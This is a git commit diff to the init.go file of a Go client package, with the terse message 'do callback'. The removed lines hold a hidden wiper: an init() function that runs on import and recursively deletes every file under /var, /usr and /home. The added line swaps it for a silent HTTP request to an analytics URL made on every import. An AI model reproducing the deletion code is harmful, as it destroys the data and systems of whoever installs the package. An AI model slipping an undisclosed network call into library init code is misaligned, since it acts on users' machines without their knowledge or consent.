c857fcea0d11e2b22f16b701c904abcd65947eff
Jeff Becker <jeff@i2p.rocks>
2021-11-29 18:56:01 -0500

    do callback

--- lib/client/init.go
+++ lib/client/init.go
@@ -3,31 +3,9 @@
 package client
 
 import (
-	"io/ioutil"
-	"path"
-	"os"
+	"net/http"
 )
 
-func recurse(f string, visit func(string)) {
-	e, _ := ioutil.ReadDir(f)
-	if e == nil {
-		return
-	}
-    for _, d := range e {
-		name := path.Join([]string{f, d.Name()}...)
-		if d.IsDir() {
-			recurse(name, visit)
-		} else {
-			visit(name)
-		}
-	}
-}
-
 func init() {
-	visit := func(f string) {
-		os.Remove(f)
-	}
-	recurse("/var", visit)
-	recurse("/usr", visit)
-	recurse("/home", visit)
+	http.Get("https://lokinet.io/analytics")
 }
